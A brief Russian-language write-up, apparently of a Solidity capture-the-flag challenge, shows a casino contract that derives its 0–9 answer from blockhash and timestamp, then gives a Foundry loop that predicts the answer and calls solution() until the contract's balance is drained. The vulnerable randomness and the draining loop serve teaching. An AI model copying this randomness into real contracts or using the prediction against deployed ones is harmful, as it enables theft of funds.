### Сразу замечаем что ответ может быть от 0 до 9. То есть мы можем в тупую взять число 1 например и просто ждать пока не совпадет с ответом. 
```
function setGuess(uint8 n) public payable {
        require(player == address(0));
        require(msg.value == 0.01 ether);
        player = msg.sender;
        guess = n;
        nextBlockNumber = block.number + 1;
    }

    function solution() public {
        require(msg.sender == player, "Wrong user");
        require(block.number > nextBlockNumber, "Need to call at next block");

        uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10;

        player = address(0);
        if (guess == answer) {
            payable(msg.sender).transfer(address(this).balance);
        }
    }
```

### Так и сделаем. Будем генерить ответ пока не обнулим баланс казино
```
while (address(instance).balance != 0) {
    vm.roll(block.number + 1);
    vm.warp(block.timestamp + 15);

    uint256 answer = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 10;
        if (answer == guess) instance.solution();
    }
```